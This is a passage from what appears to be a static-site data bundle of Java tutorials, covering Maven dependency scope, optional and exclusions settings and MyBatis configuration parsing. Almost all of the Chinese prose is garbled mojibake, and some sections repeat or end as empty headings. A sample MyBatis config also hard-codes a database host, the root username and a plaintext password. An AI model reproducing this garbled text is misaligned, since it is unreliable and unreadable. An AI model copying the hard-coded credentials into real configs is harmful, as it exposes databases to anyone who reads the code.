exclusions\n\nç¨äºæé¤ä¾èµé¡¹ä¸­ï¼ä¸éè¦æ·»å ç jarï¼æèä½¿ç¨èªå·±çæ¬ç jar èä¸éç¨å¶ä»äººææä¾ç jarãå¦ï¼å¼ç¨ç spring-boot-starter-data-redis ä¼å¸®æä»¬ä¾èµ slf4j-apiï¼ä½å®ä½¿ç¨ççæ¬è¢«çåºäº bugï¼é£æè¦åçº§å°æ´é«çæ¬ï¼å¼å¥èªå·±éä¸­ççæ¬ã\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-data-redis</artifactId>\n    <version>2.2.6.RELEASE</version>\n    <exclusions>\n        \x3c!-- æé¤spring-boot-starter-data-redisèªå¸¦ç slf4j --\x3e\n        <exclusion>\n            <groupId>org.slf4j</groupId>\n            <artifactId>slf4j-api</artifactId>\n        </exclusion>\n    </exclusions>\n</dependency>\n\n\x3c!-- å¼ç¨æ´æ¹çæ¬çslf4j --\x3e\n<dependency>\n    <groupId>org.slf4j</groupId>\n    <artifactId>slf4j-api</artifactId>\n    <version>1.7.36</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n',normalizedContent:'dependencies æ ç­¾ä¸åªä¼æä¸ä¸ª dependencyï¼dependency ä½ç¨äºæä»¬å¼ç¨åªäº jar æ¥ç»æä»¬æä¾æ´å¤çææ¯æ¯æãä¸è¬ç¨æ³:\n\n    <dependencies>\n        <dependency>\n            <groupid>org.apache.commons</groupid>\n            <artifactid>commons-pool2</artifactid>\n            <version>2.7.0</version>\n        </dependency>\n    </dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# scop\n\næ§å¶ dependency (ä¾èµ) çä½¿ç¨èå´ãéä¿çè®²ï¼å°±æ¯æ§å¶ jar åå¨åªäºèå´è¢«å è½½åä½¿ç¨ãä½¿ç¨æ¹å¼å¦ä¸ï¼\n\n<dependency>\n    <groupid>com.giant</groupid>\n    <artifactid>giant-core-security</artifactid>\n    <version>1.0-snapshot</version>\n    <scope>compile</scope>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n\n\nscop ä¸å±æ 6 ä¸ªå¼å¯ä»¥ä½¿ç¨ï¼\n\n * compileï¼é»è®¤å¼ï¼\n   å¦ææ²¡ææå® scope å¼ï¼è¯¥åç´ çé»è®¤å¼ä¸º compileãè¢«ä¾èµï¼giant-core-securitï¼jar éè¦åä¸å°å½åé¡¹ç®çç¼è¯ï¼æµè¯ï¼æåï¼è¿è¡ç­é¶æ®µãæåçæ¶åéå¸¸ä¼åå«è¢«ä¾èµï¼giant-core-securitï¼jarã\n\n * provided\n   è¢«ä¾èµ jar çè®ºä¸å¯ä»¥åä¸ç¼è¯ãæµè¯ãè¿è¡ç­é¶æ®µï¼ç¸å½äº compileï¼ä½æ¯å¨æåé¶æ®µåäº excludeï¼æé¤ï¼ çå¨ä½ãä¾å¦ï¼ å¦ææä»¬å¨å¼åä¸ä¸ªåºç¨ï¼å¨ç¼è¯æ¶æä»¬éè¦ä¾èµ xxxx.jarï¼ä½æ¯å¨è¿è¡æ¶æä»¬ä¸éè¦è¯¥ jar åï¼å ä¸ºè¿ä¸ª jar åå·²ç±åºç¨æå¡å¨æé¡¹ç®æ¬èº«æä¾è¯¥ä¾èµï¼æ­¤æ¶æä»¬éè¦ä½¿ç¨ provided è¿è¡èå´ä¿®é¥°ã\n\n * runtime\n   è¡¨ç¤ºè¢«ä¾èµ jar æ éåä¸é¡¹ç®çç¼è¯é¶æ®µï¼ä½æ¯ä¼åä¸å°é¡¹ç®çæµè¯åè¿è¡é¶æ®µãä¸ compile ç¸æ¯ï¼è¢«ä¾èµ jar æ éåä¸é¡¹ç®çç¼è¯ãéç¨åºæ¯ï¼ä¾å¦ï¼å¨ç¼è¯çæ¶åæä»¬ä¸éè¦ jdbc api ç jar åï¼èå¨è¿è¡çæ¶åæä»¬æéè¦ jdbc é©±å¨åã\n\n * test\n   è¡¨ç¤ºè¢«ä¾èµé¡¹ç®ä»ä»åä¸æµè¯ç¸å³çå·¥ä½ï¼åæ¬æµè¯ä»£ç çç¼è¯ï¼æ§è¡ãéç¨åºæ¯ï¼ä¾å¦ï¼junit æµè¯ã\n\n * system\n   system åç´ ä¸ provided åç´ ç±»ä¼¼ï¼ä½æ¯è¢«ä¾èµ jar ä¸ä¼ä» maven ä»åºä¸­æ¥æ¾ï¼èæ¯ä»æ¬å°ç³»ç»ä¸­è·åï¼systempath åç´ ç¨äºå¶å®æ¬å°ç³»ç»ä¸­ jar æä»¶çè·¯å¾ãä¾å¦ï¼\n\n<dependency>\n    <groupid>sleepycat</groupid>\n    <artifactid>je</artifactid>\n    <version>7.0.6</version>\n    <scope>system</scope>\n    <systempath>${project.basedir}/lib/je-7.0.6.jar</systempath>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n * import\n   å®åªä½¿ç¨å¨ <dependencymanagement> ä¸­ï¼è¡¨ç¤ºä»å¶å®ç pom ä¸­å¯¼å¥ dependency çéç½®ï¼ä¾å¦ï¼b é¡¹ç®å¯¼å¥ a é¡¹ç®ä¸­çåéç½®ï¼ãä¼æå¨ç¥ï¼å½æä»¬åå»ºä¸ä¸ª springboot é¡¹ç®æ¶ï¼æä»¬ä¸å®ä¼åä¸ä¸ª <parent> æ¥ç»§æ¿ spring ææä¾çææä¾èµï¼ä½å¦ææåæ³ä½¿ç¨ spring æä¾çä¾èµï¼åæ³ç»§æ¿æèªå·±çé¡¹ç®ï¼æ­¤æ¶ import å°±æäºç¨æ­¦ä¹å°\n\n# æ®é springboot ä¾èµ\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelversion>4.0.0</modelversion>\n\n    <parent>\n        <groupid>org.springframework.boot</groupid>\n        <artifactid>spring-boot-starter-parent</artifactid>\n        <version>2.2.6.release</version>\n        <relativepath/>\n    </parent>\n\n    <groupid>com.giant</groupid>\n    <artifactid>station</artifactid>\n    <version>${project-version}</version>\n    <packaging>pom</packaging>\n\n    <properties>\n        <project-version>1.0.0</project-version>\n    </properties>\n\n</project>\n\n## æ´æ¢ç»§æ¿é¡¹ç®ï¼å¹¶ä½¿ç¨springboot ä¾èµ\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelversion>4.0.0</modelversion>\n\n    \x3c!-- åä¸ºæèªå·±çç¶é¡¹ç® --\x3e\n    <parent>\n        <groupid>com.giant.parent</groupid>\n        <artifactid>boot-parent</artifactid>\n        <version>1.0-snapshot</version>\n        <relativepath/>\n    </parent>\n\n    <groupid>com.giant</groupid>\n    <artifactid>station</artifactid>\n    <version>${project-version}</version>\n    <packaging>pom</packaging>\n\n    <properties>\n        <project-version>1.0.0</project-version>\n    </properties>\n\n    \x3c!-- spring boot ä¾èµ --\x3e\n    <dependencymanagement>\n        <dependencies>\n            <dependency>\n                <groupid>org.springframework.boot</groupid>\n                <artifactid>spring-boot-starter-parent</artifactid>\n                <version>2.2.6.release</version>\n                \x3c!-- éè¦æææ¶pomè¿æ¯jar --\x3e\n                <type>pom</type>\n                <scope>import</scope>\n            </dependency>\n        </dependencies>\n    </dependencymanagement>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n\n\n\n# optional\n\noptional æ¯ maven ä¾èµ jar æ¶çä¸ä¸ªéé¡¹ï¼è¡¨ç¤ºè¯¥ä¾èµæ¯å¯éçï¼ä¸ä¼è¢«ä¾èµä¼ éãä¾å¦ï¼b ä¾èµäºæ¥å¿æ¡æ¶ logbackãlog4jãapache commons logï¼è¿æ¶å a å¼ç¨ b ç jarï¼å ä¸º maven æä¾èµä¼ éæºå¶ï¼é£ä¹ a é¡¹ç®å°±ä¼æ 3 ä¸ª jar åï¼logbackãlog4jãapache commons logãå®éä¸æä»¬ä¸è¬åªä¼å¨é¡¹ç®ä¸­ä½¿ç¨ä¸ç§æ¥å¿æ¡æ¶ï¼é£ä¹æä»¬é¡¹ç®ä¸­å°±ä¼æå¤ä½çä¾èµï¼å½è¿ç§æåµæ¶è¶æ¥è¶å¤æ¶ï¼æåæ´ä¸ªé¡¹ç®ç jar åå°±æå¾å¤çå¤ä½ä¾èµï¼å¯¼è´é¡¹ç®å¾èè¿ã\n\nå¯¹äºè¿ç§æåµï¼æä»¬åªè¦å¨ b é¡¹ç®ä¸­æ logbackãlog4jãapache commons log è®¾ç½®æ <optional>true</optional> çå³å¯ãè¿æ¶å a é¡¹ç®ä¾èµ b çæ¶åï¼é¡¹ç®ä¸­ä¸ä¼æ logbackãlog4jãapache commons log ç¸å³ jar åï¼å¯ä»¥æ ¹æ®æåµèªè¡éæ©ä¸ä¸ªå³å¯ã\n\n<dependency>\n    <groupid>org.projectlombok</groupid>\n    <artifactid>lombok</artifactid>\n    <optional>true</optional>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n\n# exclusions\n\nç¨äºæé¤ä¾èµé¡¹ä¸­ï¼ä¸éè¦æ·»å ç jarï¼æèä½¿ç¨èªå·±çæ¬ç jar èä¸éç¨å¶ä»äººææä¾ç jarãå¦ï¼å¼ç¨ç spring-boot-starter-data-redis ä¼å¸®æä»¬ä¾èµ slf4j-apiï¼ä½å®ä½¿ç¨ççæ¬è¢«çåºäº bugï¼é£æè¦åçº§å°æ´é«çæ¬ï¼å¼å¥èªå·±éä¸­ççæ¬ã\n\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-starter-data-redis</artifactid>\n    <version>2.2.6.release</version>\n    <exclusions>\n        \x3c!-- æé¤spring-boot-starter-data-redisèªå¸¦ç slf4j --\x3e\n        <exclusion>\n            <groupid>org.slf4j</groupid>\n            <artifactid>slf4j-api</artifactid>\n        </exclusion>\n    </exclusions>\n</dependency>\n\n\x3c!-- å¼ç¨æ´æ¹çæ¬çslf4j --\x3e\n<dependency>\n    <groupid>org.slf4j</groupid>\n    <artifactid>slf4j-api</artifactid>\n    <version>1.7.36</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n',charsets:{cjk:!0}},{title:"æ ¸å¿åè½æè§£ å·¥ä½æµç¨",frontmatter:{title:"æ ¸å¿åè½æè§£ å·¥ä½æµç¨",date:"2023-06-25T09:22:36.000Z",permalink:"/mybatis/mybatis/300/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/30.Mybatis/31.mybatis/300.%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD%E6%8B%86%E8%A7%A3%20%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B.html",relativePath:"00.java/30.Mybatis/31.mybatis/300.æ ¸å¿åè½æè§£ å·¥ä½æµç¨.md",key:"v-41b48450",path:"/mybatis/mybatis/300/",headers:[{level:2,title:"è§£æ",slug:"è§£æ",normalizedTitle:"è§£æ",charIndex:296},{level:3,title:"å è½½&è§£æXML",slug:"å è½½-è§£æxml",normalizedTitle:"å è½½ &amp; è§£æ xml",charIndex:null},{level:4,title:"Configuration åå§åéç½®",slug:"configuration-åå§åéç½®",normalizedTitle:"configuration åå§åéç½®",charIndex:2012},{level:4,title:"environments ç¯å¢è§£æ",slug:"environments-ç¯å¢è§£æ",normalizedTitle:"environments ç¯å¢è§£æ",charIndex:3823},{level:4,title:"mapper è§£æ",slug:"mapper-è§£æ",normalizedTitle:"mapper è§£æ",charIndex:4353},{level:4,title:"plugins æä»¶è§£æ",slug:"plugins-æä»¶è§£æ",normalizedTitle:"plugins æä»¶è§£æ",charIndex:6325},{level:4,title:"settings è®¾ç½®è§£æ",slug:"settings-è®¾ç½®è§£æ",normalizedTitle:"settings è®¾ç½®è§£æ",charIndex:6341},{level:2,title:"åå¤",slug:"åå¤",normalizedTitle:"åå¤",charIndex:299},{level:2,title:"æ§è¡",slug:"æ§è¡",normalizedTitle:"æ§è¡",charIndex:302}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"è§£æ å è½½&è§£æXML Configuration åå§åéç½® environments ç¯å¢è§£æ mapper è§£æ plugins æä»¶è§£æ settings è®¾ç½®è§£æ åå¤ æ§è¡",content:'MyBatis æ¯ä¸ä¸ª Java ç ORM æ¡æ¶ï¼å®ä½¿ç¨ XML ææ³¨è§£æ¥éç½®åæ å° SQL è¯­å¥ï¼åæ¶æä¾äºå¢å æ¹æ¥ç­å¸¸ç¨æä½ç APIãMybatis è¿æä¾äºè®¸å¤é«çº§æ å°åæ¥è¯¢åè½ï¼ä¾å¦å»¶è¿å è½½ãç¼å­åæ¹éæä½ï¼è¿ä½¿å¾å¼åäººåå¯ä»¥è½»æ¾å°ç¼ååºé«æ§è½ãå¯ç»´æ¤çæ°æ®è®¿é®å±ã\n\nå³äº MyBatis æä»¬ä¸»è¦è¦äºè§£ä»çå·¥ä½æµç¨ï¼ç¹æ§ï¼åé¨åéè¦çç¥è¯ç¹ï¼å°±å Springï¼æä»¬ä¸»è¦æ¯äºè§£ä»ççå½å¨æï¼å¯æ©å±é¡¹ç­ï¼æè°çå½å¨æï¼ä¹æ¯ Spring çå·¥ä½æµç¨ã\n\nä»¥ä¸æ¯æ´ä¸ª MyBatis çå·¥ä½æµç¨å¾ï¼å¯¹åºå¾ä¸­ä¼è®²è§£æ¯ä¸ªèç¹éè¦çç¥è¯ç¹ãè¿éè¦è®°ä½ MyBatis ä¸»è¦çå·¥ä½æ¨¡å¼å°±æ¯è§£æãåå¤åæ§è¡ï¼æè°è§£æå°±æ¯å¾å° XML çä¿¡æ¯ï¼ç»´æ¤å°ä¸ä¸ªå« Configuration çéç½®ç±»ä¸­ï¼åå¤å°±æ¯ opensession é¨åï¼ä»ä¼å¾å° Configuration ä¸­çä¿¡æ¯ï¼æ ¹æ®æ§è¡é¨åæä½¿ç¨çæ§è¡å¨ï¼æ°æ®æºï¼äºå¡ç­è¿è¡å®ä¾ååå³ç³»æ å°ï¼ä½¿ç¨å°±æ¯å½æä»¬å»è¿è¡æ¥è¯¢ææ°å¢ç­æä½ï¼ä»èµæºåä¿¡æ¯ä¸­æ¿åå·²è¢«ç¼å­çå¯¹è±¡ææ§è¡å¨ç­ï¼æ§è¡å¯¹åºçæ¹æ³ã\n\n\n\n\n# è§£æ\n\nè§£æé¨åå¯¹åºå¾ä¸­ å è½½&è§£æXML è³ XMLConfigBuilder#mapperElement è¿éï¼å¯ä»¥è¯´æ¯è¯»å XML å°ç»´æ¤åç±»å¯¹è±¡å³ç³»åä¿¡æ¯çæ ¸å¿ãä¸é¢æä»¬åè§£è®²è§£æ¯ä¸ªæ­¥éª¤é½åäºåªäºäºæä»¥åæ ¸å¿é¨åè§£æå¾å°äºä»ä¹ã\n\n\n# å è½½ & è§£æ XML\n\nè¿é¨åä¸»è¦æ¯è¯»å mybatis-config-datasource.xml æä»¶ï¼è¯¥æä»¶ä¸»è¦ç»´æ¤äºä¸äºå¬å±èµæºä¿¡æ¯ï¼åæ¬ç¯å¢ä¿¡æ¯ï¼æ°æ®åºè¿æ¥ä¿¡æ¯ï¼ï¼å¯¹åºç mapper æä»¶ä¿¡æ¯ï¼è®¾ç½®ä¿¡æ¯ç­ã\n\n<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE configuration PUBLIC "-//mybatis.org//DTD Config 3.0//EN"\n        "http://mybatis.org/dtd/mybatis-3-config.dtd">\n<configuration>\n    \x3c!-- è®¾ç½®ä¿¡æ¯ --\x3e\n    <settings>\n        \x3c!-- å¨å±ç¼å­ï¼true/false ç®¡çä¸çº§ç¼å­åäºçº§ç¼å­çæ¯å¦ä½¿ç¨ --\x3e\n        <setting name="cacheEnabled" value="true"/>\n        \x3c!--ç¼å­çº§å«ï¼SESSION/STATEMENT--\x3e\n        <setting name="localCacheScope" value="STATEMENT"/>\n    </settings>\n    \x3c!-- ç¯å¢ä¿¡æ¯ --\x3e\n    <environments default="development">\n        <environment id="development">\n            <transactionManager type="JDBC"/>\n            <dataSource type="POOLED">\n                <property name="driver" value="com.mysql.jdbc.Driver"/>\n                <property name="url" value="jdbc:mysql://10.240.30.93:3306/test?useUnicode=true&amp;characterEncoding=utf8&amp;useSSL=false"/>\n                <property name="username" value="root"/>\n                <property name="password" value="Dev@root2021"/>\n            </dataSource>\n        </environment>\n    </environments>\n    \x3c!-- ç»´æ¤ææmapper --\x3e\n    <mappers>\n        \x3c!-- XML éç½® --\x3e\n        <mapper resource="mapper/Activity_Mapper.xml"/>\n    </mappers>\n</configuration>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\nè¯»åå°æä»¶åè°ç¨ XMLConfigBuilder#parse è¿è¡è§£æï¼è§£æåå®¹å¦ä¸ã\n\n# Configuration åå§åéç½®\n\nå¨æ´ä¸ªæä»¶è§£æä¹åï¼MyBatis ä¼åæä¸äºä¿¡æ¯è¿è¡æååå§åï¼ä¹å°±æ¯ä¸å¾ä¸­ new Configurationï¼ï¼ é¶æ®µï¼è¯¥ç±»æç»ä¼è¢«å¤ä¸ª MyBatis çç±»æå¼ç¨å¹¶è´¯ç©¿æ´ä¸ª MyBatis å·¥ä½æµç¨ï¼ç±äºè¢«å¼ç¨çç±»å¤ªå¤ï¼è¿éå°±ä¸ä¸ä¸åä¸¾ï¼æä»¬åªè¦ç¥éä»è´¯ç©¿æ´ä¸ªæµç¨å³å¯ã\n\n\n\nConfiguration è¢«åå§åæ¶åå«äºå¤§éçä¿¡æ¯ï¼è¿äºä¿¡æ¯å°±æ¯å¨è§£æ xml æä»¶æ¶ç»´æ¤çï¼éä¸è®²è§£ä¸æ¯ä¸ªéç½®çå·ä½ä½ç¨ï¼\n\n * environmentï¼ç¼å­äºç¯å¢ IDï¼å¯è®¾ç½®é»è®¤ç¯å¢ï¼ç¯å¢åæ¬ï¼å¼åç¯å¢ãæµè¯ç¯å¢ç­ï¼ï¼äºå¡å·¥åï¼æ°æ®æºï¼ææ± ææ æ± æå¶ä»è¿æ¥æ± ï¼ç­\n * mapperRegistryï¼æ å°æ³¨åæºï¼ç¼å­æ¯ä¸ªæ¥å£ï¼ æ¥å£å¯¹è±¡Classåä¸ºkey ï¼æå¯¹åºç MapperProxyFactory ï¼æä¾æ·»å æ å°ä»£çç±»åè·åä»£çç±»\n * mappedStatementsï¼ç¼å­ SQL è¯­å¥çæè§£ä¿¡æ¯ãXML ç namespace.æ ç­¾IDåä¸ºï¼keyï¼ ï¼value ä¸º MappedStatementï¼ä¿¡æ¯åæ¬ï¼ mapperè·¯å¾ ï¼ SQLç±»åï¼SELECT|INSERTç­ï¼ ï¼ SQLè¯­å¥ ï¼ æ¡ä»¶ ï¼ è¯¥æ¡è¯­å¥çç¼å­ä¿¡æ¯ ï¼ è¿åç»æå¯¹è±¡ ï¼ æ¯å¦ç¼å­æ å¿ ç­ã\n * resultMapsï¼ç¼å­ resultMap æ ç­¾çæè§£ä¿¡æ¯ãXML ç namespace.resultMapåä¸ºï¼keyï¼ ï¼ç¶åå¯¹åº value å­æ¾ SQLå­æ®µï¼æ å°å¯¹è±¡å­æ®µï¼å­æ®µJAVAæ°æ®ç±»åï¼ç±»åå¯¹åºçæ§è¡å¨ ç­\n * interceptorChainï¼ç¼å­ plugins æ ç­¾çæè§£ä¿¡æ¯ãä¼å¨æ§è¡ newParameterHandlerï¼newResultSetHandlerï¼newStatementHandlerï¼newExecutor è¿è¡æ¦æªã\n * typeAliasRegistryï¼ç¼å­äºæ¯ä¸ª java åºæ¬ç±»åçå°è£ç±»ï¼ä»¥å JdbcTransactionFactoryï¼DruidDataSourceFactoryï¼UnpooledDataSourceFactoryï¼PooledDataSourceFactoryï¼PerpetualCacheï¼FifoCache ç­ Mybatis æä¾çå·²ç¥ç±»ï¼ç¨äºå¿«éè§£æ XML æè¿°çå¼ï¼ä¾¿äºå¿«éå¾å° Class ä¿¡æ¯å¹¶è·åå®ä¾ã\n * typeHandlerRegistryï¼å­æ¾å¯¹åºæ°æ®ç±»åçå¤çç­ç¥ï¼æ¯å¦ JAVA ç±»åï¼å¯¹åº SQL ç±»åçå¤çç­ç¥ï¼æ JAVA ç±»åå¯¹åºçå¤çç­ç¥ãç¨äºè®¾ç½® SQL è¯­å¥åæ°åè·åæ¥è¯¢ç»æçæ°æ®ç±»åè½¬æ¢ç­ç¥ã\n * objectFactoryï¼å¯¹è±¡å·¥åï¼ç¨äºåå»ºå¯¹è±¡å®ä¾ï¼ä½¿ç¨åå°ã\n * objectWrapperFactoryï¼å¯¹è±¡åè£å¨ï¼æ¾çï¼è¢«è§£æå¯¹è±¡çå®ä¾ï¼ä»¥åå¯¹åºç setï¼getï¼æé å¨ï¼ç±»åç­ä¿¡æ¯ã objectFactory ä¸ objectWrapperFactory æ¯ä¸º MetaObject æä¾æ¯æçï¼ä»¥è§£æå¯¹è±¡ä¿¡æ¯è¿è¡ï¼ç¶åè·åå¯¹è±¡æä¸ªç¹å®å±æ§çæ°æ®ï¼ç¼å­æ¯ä¸ºäºå å¿«è·åéåº¦ï¼å¦æå±æ§ä¹æ¯ä¸ä¸ªå¯¹è±¡åä¼éå½ç¼å­ï¼è·åå¼ä¹ä¼éå½è·åã\n * loadedResourcesï¼å­æ¾å·²è¢«å è½½ç mapper.xml æä»¶ï¼ä»¥é²æ­¢éå¤å è½½\n * languageRegistryï¼å­æ¾é»è®¤çè¯­è¨è§£æé©±å¨å¨ï¼æ¯å¦å­æ¾äº XMLLanguageDriver ï¼æä¾å¿«éè·åè¿ä¸ªè§£æå¨ï¼ç¶åæä¾ SQL è§£æã\n * cacheEnabledï¼è§£ææ¯å¦å¯ç¨ç¼å­ï¼è¯¥éç½®å¯¹äºäºçº§ç¼å­çæï¼ä¸æ¬¡ç¼å­æ¯é»è®¤ç¼å­ã\n * localCacheScopeï¼ä¸çº§ç¼å­ï¼ç¼å­ç­ç¥é»è®¤æ¯æ°¸ä¹ç¼å­ï¼ç¼å­æ¹å¼åä¸º SESSION å STATEMENT ï¼ SESSION å¨è¯¥ä¼è¯ä¸­å½ä¸­ç¸å sql è¯­å¥åæ¡ä»¶ï¼è¥å¨è¯¥ SESSION ä¸­åç insert/update/delete/commit/rollback/close åä¼æ¸é¤ç¼å­ï¼ä½æ¯ï¼å¹¶ä¸ä¼å½±åå¶å®ä¼è¯ä¸­çç¼å­ï¼ STATEMENT ï¼åªéå¯¹å½åä¼è¯æ§è¡çè¿ä¸è¯­å¥ææï¼æ§è¡å®æ¯æ¥è¯¢ä¼ç«å³æ¸é¤ç¼å­ã\n * cachesï¼äºçº§ç¼å­ï¼åºäº namespace çç¼å­ï¼å¯æä¾ç¬¬ä¸æ¹å¶ä»æ¹å¼å®ç°ã\n\n# environments ç¯å¢è§£æ\n\nå¨ç¯å¢è§£æè¿ç¨ä¸­ä¼å¾å°ä¸é¢å ä¸ªéè¦çå±æ§ï¼\n\n * IDï¼è¡¨æä½¿ç¨åªä¸ä¸ªç¯å¢åä¸ºä¸»è¦ç¯å¢éç½®ï¼è§£æ XML ä¸­ç <environment > æ ç­¾\n * TransactionFactoryï¼è§£æ XML ä¸­ç <transactionManager> ç type å±æ§ï¼å¦ææ¯ JDBC åå°±æ¯ JdbcTransactionFactory ï¼ä¹å¯ä»¥èªè¡è®¾ç½®ï¼éè¦èªå·±æ³¨åå° typeAliasRegistry ä¸­\n * DataSourceFactoryï¼è§£æ XML ä¸­ <dataSource> ç type å±æ§ï¼å¦ææ¯ POOLED ï¼åå¯¹åº PooledDataSourceFactory ï¼ UNPOOLED å¯¹åº UnpooledDataSourceFactory ï¼ DRUID å¯¹åº DruidDataSourceFactory\n * DataSourceï¼è§£æ XML ä¸­ <property> å¾å°å·ä½çè¿æ¥ä¿¡æ¯ï¼ä» DataSourceFactory ä¸­è·å DataSource\n\nå½ä»¥ä¸çä¿¡æ¯ç»ä»¶å®æ¯åä¼å°è£å° Environment ä¸­ï¼ç¶åæ·»å å° configuration\n\n# mapper è§£æ\n\nå¨ mapper è§£æä¸­æä¸¤ç§ä¸åçè§£æï¼ä¸ä¸ªæ¯æä»¬å¸¸è§ç XML è§£æï¼ä¸ç§æ¯æ³¨è§£ï¼å¦ @selectï¼è¿éåªè®² XML è§£æï¼æå³ @select ç­æ³¨è§£è§£æï¼æ¾å¨åç»­ä¸å¼ä¸ç« ãé£è§£æé¦åä¼è¯»åæå°ææç mapperï¼å¨åå«è§£ææ¯ä¸ª mapper\n\n    <mappers>\n        \x3c!-- XML éç½® --\x3e\n        <mapper resource="mapper/Activity_Mapper.xml"/>\n    </mappers>\n\n\n1\n2\n3\n4\n\n\nä¸ä¸ªå®æ´ç Mapper å¤§è´åå«å¦ä¸ä¿¡æ¯ï¼æä»¥åé¨ä¼æå¤ä¸ªè§£æåå«è§£æï¼å¦ cache è§£æï¼resultMap è§£æï¼select è§£æï¼insert è§£æç­ï¼æä»¬è¿éè¯´ä¸éè¦çè§£æå¯¹è±¡åä½ç¨å³å¯ã\n\n<mapper namespace="cn.bugstack.mybatis.test.dao.IActivityDao">\n    <cache eviction="FIFO" flushInterval="600000" size="512" readOnly="true"/>\n    <resultMap id="activityMap" type="cn.bugstack.mybatis.test.po.Activity">\n        <id column="id" property="id"/>\n        <result column="activity_id" property="activityId"/>\n        <result column="activity_name" property="activityName"/>\n        <result column="activity_desc" property="activityDesc"/>\n        <result column="create_time" property="createTime"/>\n        <result column="update_time" property="updateTime"/>\n    </resultMap>\n    <select id="queryActivityById" parameterType="cn.bugstack.mybatis.test.po.Activity" resultMap="activityMap" flushCache="false" useCache="true">\n        SELECT activity_id, activity_name, activity_desc, create_time, update_time\n        FROM activity\n        <trim prefix="where" prefixOverrides="AND | OR" suffixOverrides="and">\n            <if test="null != activityId">\n                activity_id = #{activityId}\n            </if>\n        </trim>\n    </select>\n</mapper>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n<cache > æ ç­¾éç½®äºäºçº§ç¼å­ï¼å¯¹äºç¼å­ä¹ä¼æåç¬çä¸ç« è®²è§£ï¼è¿éåªè®²è§£æå¾å°çéè¦ç±»åä½ç¨ï¼éè¿æ ç­¾ä¼å°è£ä¸ä¸ª Cache å¯¹è±¡ï¼è¯¥å¯¹è±¡ä»¥ namespace åä¸º cache ç Id ï¼å¹¶æ Cache å¯¹è±¡æ·»å å° configuration ä¸­\n\n<resultMap> æ ç­¾éç½®ä¸ä¸ª <select > æ ç­¾ç resultMap å±æ§è¿åç»æå¯¹è±¡çå³ç³»æ å°ï¼ä»ä¼å¾å°å¯¹è±¡ä»¥åå¾å°æè¿°çå java å±æ§ç±»ååå¯¹åºç TypeHandler ç±»åå¤çå¨ï¼å¨è¿åçæ¶åä½¿ç¨ç±»åå¤çå¨ï¼å¤çæ¥è¯¢è¿åç»æçæ°æ®ç±»åå¯¹åº java çæ å°ã <resultMap> æ ç­¾å¯ä»¥æå¤ä¸ªï¼æä»¥ä¼æ·»å å°éåä¸­ï¼ç¶åç»´æ¤å° configuration ä¸­\n\n<select> or <insert> è¿éæä¸»è¦çé¨åå°±æ¯å¨è§£æå®æåä¼æ namespace.id åä¸º key ï¼æè§£æçä¿¡æ¯ MappedStatement åä¸º value ï¼ç»´æ¤å° configuration ä¸­ï¼ä»¥ä¾¿ Mybatis å¨è¢«ä»£çç±»è°ç¨æ¹æ³çæ¶åå¿«éæ¾å°ï¼è¯¥æ¹æ³å¯¹åºç SQL ä¿¡æ¯ç­\n\n# plugins æä»¶è§£æ\n\n# settings è®¾ç½®è§£æ\n\n\n# åå¤\n\n\n# æ§è¡',normalizedContent:'mybatis æ¯ä¸ä¸ª java ç orm æ¡æ¶ï¼å®ä½¿ç¨ xml ææ³¨è§£æ¥éç½®åæ å° sql è¯­å¥ï¼åæ¶æä¾äºå¢å æ¹æ¥ç­å¸¸ç¨æä½ç apiãmybatis è¿æä¾äºè®¸å¤é«çº§æ å°åæ¥è¯¢åè½ï¼ä¾å¦å»¶è¿å è½½ãç¼å­åæ¹éæä½ï¼è¿ä½¿å¾å¼åäººåå¯ä»¥è½»æ¾å°ç¼ååºé«æ§è½ãå¯ç»´æ¤çæ°æ®è®¿é®å±ã\n\nå³äº mybatis æä»¬ä¸»è¦è¦äºè§£ä»çå·¥ä½æµç¨ï¼ç¹æ§ï¼åé¨åéè¦çç¥è¯ç¹ï¼å°±å springï¼æä»¬ä¸»è¦æ¯äºè§£ä»ççå½å¨æï¼å¯æ©å±é¡¹ç­ï¼æè°çå½å¨æï¼ä¹æ¯ spring çå·¥ä½æµç¨ã\n\nä»¥ä¸æ¯æ´ä¸ª mybatis 